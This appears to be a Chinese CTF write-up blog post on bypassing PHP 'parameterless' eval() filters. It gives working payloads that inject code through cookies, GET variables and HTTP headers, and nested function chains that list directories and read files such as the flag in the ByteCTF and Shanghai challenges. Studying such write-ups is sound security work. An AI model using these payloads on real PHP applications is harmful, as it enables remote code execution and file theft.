@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>php无参数RCE</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/&title=php无参数RCE" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/&title=php无参数RCE" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/&text=php无参数RCE" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php无参数RCE&body=Check out this article: http://yoursite.com/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-源代码分析"><span class="toc-number">1.</span> <span class="toc-text">0x 01 源代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-解题方法"><span class="toc-number">2.</span> <span class="toc-text">0x 02 解题方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-例题分析"><span class="toc-number">3.</span> <span class="toc-text">0x 03 例题分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-ByteCTF-Boringcode"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 ByteCTF Boringcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-2019上海市大学生网络安全大赛-decade"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 2019上海市大学生网络安全大赛_decade</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        php无参数RCE
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-20T11:12:14.000Z" itemprop="datePublished">2020-03-20</time>
+        
+        (Updated: <time datetime="2020-03-19T16:14:15.789Z" itemprop="dateModified">2020-03-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/tricks/">tricks</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/" rel="tag">php无参数RCE</a>, <a class="tag-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x-01-源代码分析"><a href="#0x-01-源代码分析" class="headerlink" title="0x 01 源代码分析"></a>0x 01 源代码分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_replace 的主要功能就是限制我们传输进来的必须时纯小写字母的函数，而且不能携带参数，例如print_r(&quot;123&quot;);这种的，是不允许进行传入的</span><br><span class="line">preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-02-解题方法"><a href="#0x-02-解题方法" class="headerlink" title="0x 02 解题方法"></a>0x 02 解题方法</h3><ul>
+<li>http-header传参</li>
+</ul>
+<p>在session_id中设置我们想要输入的RCE，达到传参的目的，但是第一点需要session_start()开启session会话。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：code&#x3D;eval(hex2bin(session_id(session_start())));</span><br><span class="line">		Cookie: PHPSESSID&#x3D;706870696e666f28293b</span><br><span class="line"></span><br><span class="line">### hex(&quot;phpinfo();&quot;)&#x3D;706870696e666f28293b</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206195207981.png" alt></p>
+<ul>
+<li><p>post/get传入参数</p>
+<p>get_defined_vars()函数</p>
+</li>
+</ul>
+<p>get_defined_vars ( void ) : array 返回由所有已定义变量所组成的数组<br> 此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?code&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206195944964.png" alt></p>
+<p>​    getallheaders()函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paylaod:?code&#x3D;eval(end(getallheaders()));</span><br><span class="line">		lxj: phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206200741938.png" alt></p>
+<p>任意文件读取：dirname() &amp; chdir()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当前目录的目录遍历:?code&#x3D;var_dump(scandir(getcwd()));</span><br><span class="line">目录上跳遍历：?code&#x3D;var_dump(scandir(dirname(getcwd())));、</span><br><span class="line">修改目录：chdir(dirname(getcwd()))</span><br><span class="line">具体参考：https:&#x2F;&#x2F;skysec.top&#x2F;2019&#x2F;03&#x2F;29&#x2F;PHP-Parametric-Function-RCE&#x2F;#%E6%B3%95%E4%BA%94%EF%BC%9Adirname-amp-chdir</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-03-例题分析"><a href="#0x-03-例题分析" class="headerlink" title="0x 03 例题分析"></a>0x 03 例题分析</h3><h4 id="3-1-ByteCTF-Boringcode"><a href="#3-1-ByteCTF-Boringcode" class="headerlink" title="3.1 ByteCTF Boringcode"></a>3.1 ByteCTF Boringcode</h4><p>原题部分代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$code &#x3D; file_get_contents($url);</span><br><span class="line">            if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code)) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code)) &#123;</span><br><span class="line">                    echo &#39;bye~&#39;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;error: host not allowed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;error: invalid url&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题加大了很多难度，过滤了这么些东西 <code>/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/</code></p>
+<p>首先利用readfile(end(scandir(“.”))) # </p>
+<p>可以成功读取当前目录下的最后一个文件的，下一步就是绕过”.”</p>
+<p>这里利用了localeconv()函数，函数返回的数组第一位正是我们需要的“.”函数，尝试构造一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(reset(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p>可以成功读取当前目录下的最后一个文件,其他构造点的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) #46</span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) #46</span><br></pre></td></tr></table></figure>
+
+<p>参考payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</span><br><span class="line"># next(scandir(pos(localeconv()))) 返回字符串&#39;..&#39;即当前目录的上一级目录</span><br><span class="line"># 使用chdir()函数，更改目录，返回1的同时，读取目录下的文件</span><br><span class="line"></span><br><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br><span class="line"># 通过chdir修改当前目录，通过localtime()等函数构造chr（46）即“.”达到读取上层目录文件的目的</span><br></pre></td></tr></table></figure>
+
+<p>官方WP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br></pre></td></tr></table></figure>
+<h4 id="3-2-2019上海市大学生网络安全大赛-decade"><a href="#3-2-2019上海市大学生网络安全大赛-decade" class="headerlink" title="3.2 2019上海市大学生网络安全大赛_decade"></a>3.2 2019上海市大学生网络安全大赛_decade</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">if (!empty($code)) &#123;</span><br><span class="line">        if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code)) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code)) &#123;</span><br><span class="line">            echo &#39;bye~&#39;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;invalid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">        echo &quot;invalid&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>相比Byte发现与Byte的题目很相似，不同的就是正则过滤的更多了，我们就不能使用readfile等方式去读文件了，也不能用time的方式去获取“.”了。首先还是fuzz一下，php中类似readfile的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">var_dump(gettype(get_defined_functions()));</span><br><span class="line">var_dump(count(get_defined_functions()[internal]));</span><br><span class="line">&#x2F;&#x2F; var_dump(preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, &#39;111&#39;));</span><br><span class="line"> </span><br><span class="line">$i_need_func&#x3D;array();</span><br><span class="line">$j&#x3D;0;</span><br><span class="line">for ($i&#x3D;0; $i &lt; count(get_defined_functions()[internal]) ; $i++) &#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|xdebug|prvd|_|-&#x2F;i&#39;, get_defined_functions()[internal][$i])) &#123;</span><br><span class="line">        $i_need_func[$j]&#x3D;get_defined_functions()[internal][$i];</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($i_need_func);</span><br></pre></td></tr></table></figure>
+
+<p>发现readgzfile这个函数，看一下函数的定义，主要是读取一个压缩文件，不过在本地测试时发现，该函数也可以实现readfile的功能去读取文件。</p>
+<p>字节跳动原payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>将readfile修改为readgzfile,这里不再使用time()函数，使用ord()、hebrevc()等函数构造,在7.0的php环境下：</p>
+<p>首先尝试读取当前目录下的文件，仍然是构造“.”，原来构造的paylod：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(reset(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<p>因为题目中正则将“local”给过滤了，所以要换种方法去构造，本地尝试构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>但因为sqrt函数被过滤，继续构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ord(hebrevc(crypt(phpversion()))));</span><br></pre></td></tr></table></figure>
+
+<p>crypt每次加密都是随机的，修改payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>极客大挑战 2019</p>
+<p><img src="http://static.zybuluo.com/Pdsdt/el86boz75xe4eu21dt8p9ois/image.png" alt="image.png-130.7kB"></p>
+<p>该函数会获取我们传输中headers的所有信息并以数组形式输出，我们可以将恶意代码写在传输的headers头中，再使用该函数进行包含执行，这样就可以达到我们绕过检测命令执行的目的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#headers : readfile(&quot;theflag.php&quot;);</span><br><span class="line"></span><br><span class="line">eval(end(getallheaders()));</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="https://www.cnblogs.com/sylover/p/11863778.html" target="_blank" rel="noopener">https://www.cnblogs.com/sylover/p/11863778.html</a></p>
+<p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
+<p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/" target="_blank" rel="noopener">http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-源代码分析"><span class="toc-number">1.</span> <span class="toc-text">0x 01 源代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-解题方法"><span class="toc-number">2.</span> <span class="toc-text">0x 02 解题方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-例题分析"><span class="toc-number">3.</span> <span class="toc-text">0x 03 例题分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-ByteCTF-Boringcode"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 ByteCTF Boringcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-2019上海市大学生网络安全大赛-decade"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 2019上海市大学生网络安全大赛_decade</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/&title=php无参数RCE" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/&title=php无参数RCE" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/&text=php无参数RCE" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php无参数RCE&body=Check out this article: http://yoursite.com/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
